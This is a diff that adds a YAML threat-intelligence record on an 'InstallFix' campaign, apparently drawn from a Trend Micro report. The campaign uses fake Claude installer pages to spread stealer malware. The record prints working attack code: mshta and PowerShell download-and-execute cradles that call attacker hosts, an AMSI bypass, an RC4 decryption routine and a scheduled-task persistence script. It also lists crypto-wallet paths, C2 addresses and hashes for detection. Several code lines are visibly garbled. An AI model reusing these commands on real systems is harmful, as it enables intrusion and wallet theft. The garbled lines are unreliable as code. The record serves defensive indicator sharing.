@@ -1,0 +1,146 @@
+title: 'InstallFix and Claude Code: How Fake Install Pages Lead to Real Compromise'
+description: The InstallFix campaign uses fake Claude AI installer pages to trick
+  users into running malware that collects system information, disables security features,
+  achieves persistence, and connects to attacker-controlled C&C servers for additional
+  payloads.
+attribution: ''
+malware_families:
+- RedLine stealer
+- InstallFix
+- RedLine Stealer
+cves: []
+ttps:
+  processes:
+  - powershell.exe
+  - mshta.exe
+  - cmd.exe
+  command_lines:
+  - mshta https://download-version[.]1-5-8[.]com/claude[.]msixbundle
+  - cmd /v:on /c "set x=pow&&set y=ershell&&call %windir%\SysWOW64\WindowsPowerShell\v1.0\!x!!y!
+    -E {base64-encoded}"
+  - mshta https://download-version.1-5-8.com/claude.msixbundle
+  - CAWINDOWS\system32\mshta.exe httpsy//download.version-516.com/othereventSubld
+    0 - TELEMETRY_NONEwinEventid 3 106 - Task registeredfileNamemalName FilelessCleanupfilePath
+    cA\Window. tem32\Tasks\interestedip flmalType Virus/MalwareactResult File cleaned
+  powershell:
+  - '{[Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{base64-encoded}"))}'
+  - '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}'
+  - $nipple = (Get-FileHash -InputStream([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME
+    + $env:USERNAME))) -Algorithm MD5).Hash.Substring(0,16).ToLower()
+  - '[Runtime.InteropServices.Marshal]::WriteInt32(<amsiContext>, 0x41414141)'
+  - $Filter = (New-Object Net.WebClient).DownloadString("https://$nipple.oakenfjrod[.]ru/cloude-91267b64-989f-49b4-89b4-984e0154d4d1");IEX
+    $Filter
+  - $nipple=(Get-FileHash -InputStream([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes
+    ($env:COMPUTERNAME+$env:USERNAME))) | SortAlgorithm MD5) . HbsheSubotning(estcimTobanani)s
+    oy otonetictebonudooRointilonagonhmSonvantontitiostayalidationcallboalm il otrue};
+  - function TenantId { param ($local, $startPosition); return [Byte]((-bnot($local
+    -band $startPosition)) -band (-bnot e((-bnot $local) -band (-bnot $startPosition))))
+    };
+  - $msbuildEngine = 256; function GlobalJson { param ($vsMinversion, $sessions);
+    $restore = New-Object Byte[] $msbuildEngine; $noPath = New-Object Byte[] $msbuildEngine;
+    for ($packagePath = 0; $packagepath -lt $msbuildEngine; $packagePath++) { $restore[$packagePath]
+    = $packagePath; $noPath[$packagePath] = $sessions[$packagePath % $sessions.Length];
+    }; $outputConfigurationData = @(); for ($packagePath = 0; $packagePath -lt $msbuildEngine;
+    $packagePath++) { $outputConfigurationData = ($outputConfigurationData + $restore[$packagepath]
+    + $nopath[$packagepath]) % $msbuildengine; $shaFile = $restore[$packagePath];
+    $restore[$packagePath] = $restore[$outputConfigurationData]; $restore[$outputConfigurationData]
+    = $shaFile; }; $packagePath = $packagePath = $outputConfigurationData = 0;for
+    ($ResourcesPath = 0; $ResourcesPath -lt $vsMinVersion.Length; $ResourcesPath++)
+    { $packagePath = ($packagePath + 1) %$msbuildEngine; $outputConfigurationData  ($outputConfigurationData
+    + $restore[$packagePath]) % $msbuildengine; $shaFile = $restore[$packagePath];
+    $restore[$packagePath] = $restore[$outputConfigurationData]; $restore[$outputConfigurationData]
+    = $shaFile; [int]$basePath  ($restore[$packagePath] + $restore[$outputConfigurationDatal)
+    % $msbuildengine; $vsMinversion[$ResourcesPath] = TenantId $vsMinversion[$ResourcesPath]
+    $restore[$basePath]; }; $vsMinversion };
+  - $variab1eTable:[System.Text.Encoding]::UTF&GEtBytes(;function credentry {[System.Text.Encoding]::UTF8.GetString((GlobalJson
+    ([System.Convert]::FromBase64String($args[0])) $variableTable))};
+  - try{[Runtime.TInteropServices.Marshal]: :WriteInt32([Ref]. (credEntry "jndMLem7gvg=").GetType((credEntry
+      "NH1MPOG@wMybgUQNpPThjjbafsn3DgeROE17PODPPWMFDE375k5s=")) .GetField((credEntry
+      "rmlMIce2gPWfliE="), [Reflection.BindingFlags](credEntry "gWtRGPG7guizZw3Y@oJFvgA==")).GetValue($null),
+      [{nt]|(credEntry /3wlLebDo2rD03g==")|;}catch{};
+  - $possiblePaths=New-Object Net.WebClient;$Filter=$possiblePaths.Downloadstring("https://$nipple.oakenfjrod.ru/cloude-91267b64-989f-49b4-89ba-984e0154d4d1"
+    ) ;TEX $Filter;
+  scripts:
+  - Dim ThisBuyout ThisBuyout = ObjectBrokerage(53636865") ThisBuyout = ThisBuyout
+    ObjectBrokerage(64756c652e5365")ObjectBrokerage(7276696365") Set SetOff = CreateObject(ThisBuyout)
+    Call SetOff.ConnectDim ThisBuyoutThisBuyout = "Schedule.Service"Set SetOff = CreateObject(ThisBuyout)Call
+    SetOff.ConnectMediumZero.RegisterTaskDefinition(ObjectBrokerage(73657276") ObjectBrokerage("696365686d62"),
+    ProcessInstitution, 6, , , 3)IndexRecourse 2 Function SetUnit(t) Dim TopLiability
+    Dim GetEconomy Dim TopDow Dim ObjectExceed Dim GetBid Dim ProcessStockMediumZero.RegisterTaskDefinition("servicehmbTM,
+    ProcessInstitution, 6, , , 3)6 = replace if it already exists3 = highest privilege
+    (run as SYSTEM / hidden)This ensures persistent execution even if the user reboots.
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - powershell.exe -> download-version[.]1-5-8[.]com:443
+  - cmd.exe -> oakenfjrod[.]ru:443
+  - mshta.exe -> oakenfjrod[.]ru:80
+  - powershell.exe -> hosted-by.yeezyhost.net:43
+  - powershell.exe -> hosted-by.yeezyhost.net:443
+  file_activity:
+  - C:\Users\Default\AppData\Roaming\MyMonero
+  - C:\Users\Sec504\AppData\Roaming\MyMonero
+  - C:\Users\Default\AppData\Roaming\Komodo\PIRATE\
+  - C:\Users\Default User\AppData\Roaming\Komodo\PIRATE)\
+  - C:\Users\Default\AppData\Roaming\Komodo\PIRATEN
+  - C:\Users\Sec504\AppData\Roaming\Komodo\PIRATE)\N
+  - C:\Users\Default\AppData\Roaming\Sumokoin
+  - C:\Users\Default\AppData\Roaming\SumokoinX
+  - C:\Users\Default\AppData\Roaming\SumokoinXN
+  - C:\Users\Sec504\AppData\Roaming\SumokoinN
+  - C:\Users\Default\AppData\Roaming\VRSC
+  - C:\Users\Default\AppData\Roaming\VRSCN
+  - C:\Users\Default\AppData\Roaming\VRSC3
+  - C:\Users\Sec504\AppData\Roaming\VRSCN
+  - C:\Users\Default\AppData\Roaming\wownero3
+  - C:\Users\Sec504\AppData\Roaming\wowneroN
+  - C:\Users\Default\AppData\Roaming\Zclassic
+  - C:\Users\Default\AppData\Roaming\ZclassicX
+  - C:\Users\Default\AppData\Roaming\ZclassicN
+  - C:\Users\Sec504\AppData\Roaming\ZclassicN
+  - C:\Users\Default\AppData\Roaming\Infinity Wallet
+  - C:\Users\Default\AppData\Roaming\Infinity WalletN
+  - C:\Users\Sec504\AppData\Roaming\Infinity WalletN
+  - C:\Users\Default\AppData\Roaming\Klever
+  - C:\Users\Default\AppData\Roaming\KleverN
+  - C:\Users\Sec504\AppData\Roaming\KleverN
+  - C:\Users\Default\AppData\Roaming\TokenPocket
+  - C:\Users\Default\AppData\Roaming\TokenPocketX
+  - C:\Users\Default\AppData\Roaming\TokenPocketN
+  - C:\Users\Sec504\AppData\Roaming\TokenPocketXN
+  - C:\Users\Default\AppData\Roaming\ZelCore
+  - C:\Users\Default\AppData\Roaming\ZelCoreX
+  - C:\Users\Default\AppData\Roaming\ZelCoreXN
+  - C:\Users\Sec504\AppData\Roaming\ZelCore3
+  - C:\Users\Default\AppData\Roaming\BlueWallet
+  - C:\Users\Default\AppData\Roaming\BlueWalletX
+  - C:\Users\Default\AppData\Roaming\BlueWalletN
+  - C:\Users\Sec504\AppData\Roaming\BlueWalletW
+  persistence:
+  - Scheduled tasks creation for persistence
+  - Scheduled task creation for persistence
+  - Registry Run key (HKLM) pointing to scheduled task for fileless cleanup
+  process_relations:
+  - powershell.exe -> mshta.exe
+  - mshta.exe -> cmd.exe
+  - mshta.exe -> powershell.exe
+iocs:
+  hashes:
+  - 811fbf0ff6b6acabe4b545e493ec0dd0178a0302
+  - 2f04ba77bb841111036b979fc0dab7fcbae99749718ae1dd6fd348d4495b5f74
+  ip_addresses:
+  - 104[.]21[.]0[.]95
+  - 185[.]177[.]239[.]255
+  - 77[.]91[.]97[.]244
+  - 77.91.97.244
+  domains:
+  - download-version[.]1-5-8[.]com
+  - oakenfjrod[.]ru
+  - hostedby
+  urls:
+  - hxxps://download-version[.]1-5-8[.]com/claude[.]msixbundle
+  - hxxps://download-version.1-5-8.com/claude.msixbundle
+authors: []
+reference: https://www.trendmicro.com/en_us/research/26/e/installfix-and-claude-code.html
+date_of_publication: May 05, 2026
+file_creation_date: May 09, 2026
